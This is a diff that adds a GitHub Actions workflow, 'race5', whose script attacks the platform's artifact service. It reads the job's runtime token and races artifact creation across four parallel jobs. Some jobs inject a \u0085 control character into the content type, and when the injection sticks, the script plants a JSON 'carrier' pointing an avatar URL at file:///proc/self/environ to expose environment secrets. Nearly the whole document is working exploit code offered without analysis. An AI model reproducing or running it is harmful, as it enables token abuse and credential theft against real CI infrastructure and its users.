@@ -1,0 +1,121 @@
+name: race5
+
+on:
+  workflow_dispatch:
+
+jobs:
+  hammer:
+    runs-on: ubuntu-latest
+    permissions:
+      actions: write
+      contents: read
+    strategy:
+      fail-fast: false
+      matrix:
+        side: [a, b, c, d]
+    steps:
+      - uses: actions/github-script@v7
+        env:
+          SIDE: ${{ matrix.side }}
+        with:
+          script: |
+            const https = require('node:https');
+            const crypto = require('node:crypto');
+
+            const endpoint = process.env.ACTIONS_RESULTS_URL || '';
+            const token = process.env.ACTIONS_RUNTIME_TOKEN || '';
+            const claims = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString('utf8'));
+            let runId, jobId;
+            for (const s of String(claims.scp || '').split(' ')) {
+              if (s.startsWith('Actions.Results:')) { const p = s.split(':'); runId = p[1]; jobId = p[2]; }
+            }
+            const SVC = endpoint.replace(/\/+$/, '')
+              + '/twirp/github.actions.results.api.v1.ArtifactService/';
+            const ODD = '\u0085application/json';
+            const IDS = { workflow_run_backend_id: runId, workflow_job_run_backend_id: jobId };
+            const side = process.env.SIDE;
+            const repo = process.env.GITHUB_REPOSITORY;
+            const probe = Buffer.from('{"probe":"sync-race"}');
+            const digest = 'sha256:' + crypto.createHash('sha256').update(probe).digest('hex');
+            const sleep = (ms) => new Promise(r => setTimeout(r, ms));
+
+            async function rpc(method, body) {
+              try {
+                const r = await fetch(SVC + method, { method: 'POST',
+                  headers: { Authorization: 'Bearer ' + token, 'Content-Type': 'application/json' },
+                  body: JSON.stringify(body) });
+                const text = await r.text();
+                let json = null; try { json = JSON.parse(text); } catch (e) {}
+                return { status: r.status, json, text: text.slice(0, 110) };
+              } catch (e) { return { status: 0, json: null, text: String(e).slice(0, 110) }; }
+            }
+            function put(url, body, ct) {
+              return new Promise((resolve) => {
+                const u = new URL(url);
+                const req = https.request({ method: 'PUT', hostname: u.hostname,
+                  path: u.pathname + u.search,
+                  headers: { 'x-ms-blob-type': 'BlockBlob', 'x-ms-blob-content-type': ct,
+                             'x-ms-version': '2021-08-06',
+                             'content-length': Buffer.byteLength(body) } },
+                  (res) => { res.resume(); res.on('end', () => resolve(res.statusCode)); });
+                req.on('error', () => resolve('ERR')); req.end(body);
+              });
+            }
+            const urlOf = (r) => r.json && (r.json.signedUploadUrl || r.json.signed_upload_url);
+            const idOf = (r) => r.json && String(r.json.artifactId || r.json.artifact_id || '');
+
+            // Artifact names are unique per workflow RUN, not per job, so separate jobs can
+            // collide on one name with real wall-clock concurrency - which a single
+            // process's Promise.all never achieves (there the first request simply wins).
+            // All sides fire on the same absolute millisecond grid.
+            const BARRIER = 45000;            // leave room for all jobs to boot
+            const SLOT = 700;
+            const t0 = Math.ceil(Date.now() / BARRIER) * BARRIER;
+            core.info(`side=${side} barrier=${t0} now=${Date.now()}`);
+            while (Date.now() < t0) await sleep(25);
+
+            const spec = (side === 'a' || side === 'c')
+              ? [6, ODD] : [7, 'application/json'];
+            const created = [];
+            for (let i = 0; i < 48; i++) {
+              const when = t0 + i * SLOT;
+              while (Date.now() < when) await sleep(2);
+              const name = `sync-${i}`;
+              const c = await rpc('CreateArtifact',
+                { ...IDS, name, version: spec[0], mime_type: spec[1] });
+              created.push([name, c.status, urlOf(c)]);
+            }
+            core.info(`side=${side} creates=${JSON.stringify(created.map(c => c[1]))}`);
+
+            // one side finalizes and reports what the delivery metadata became
+            if (side !== 'a') { core.info(`side=${side} done`); return; }
+            const rows = [];
+            for (const [name, status, url] of created) {
+              if (!url) { rows.push([name, 'nourl']); continue; }
+              await put(url, probe, ODD);
+              const f = await rpc('FinalizeArtifact',
+                { ...IDS, name, size: String(probe.length), hash: digest });
+              const id = idOf(f);
+              const v = await rpc('GetSignedArtifactURL', { ...IDS, name });
+              let rsct = null;
+              const su = v.json && (v.json.signedUrl || v.json.signed_url);
+              if (su) { try { rsct = new URL(su).searchParams.get('rsct'); } catch (e) {} }
+              const odd = typeof rsct === 'string' && rsct.includes('\u0085');
+              rows.push([name, id, rsct, odd]);
+              if (odd && id) {
+                const carrier = Buffer.from(JSON.stringify({
+                  full_name: `${repo}/actions/artifacts/${id}/zip`,
+                  owner: { login: 'cassette', avatar_url: 'file:///proc/self/environ' },
+                  description: 'repo cassette carrier', stargazers_count: 0 }));
+                await put(url, carrier, ODD);
+                core.info(`WINNER5 ${JSON.stringify({ id,
+                  repository: `${repo}/actions/artifacts/${id}/zip` })}`);
+              }
+            }
+            const tally = {};
+            for (const r of rows) {
+              const k = r[3] ? 'ODD' : String(r[2]);
+              tally[k] = (tally[k] || 0) + 1;
+            }
+            core.info('TALLY5 ' + JSON.stringify(tally));
+            core.info('ROWS5 ' + JSON.stringify(rows.slice(0, 8)));
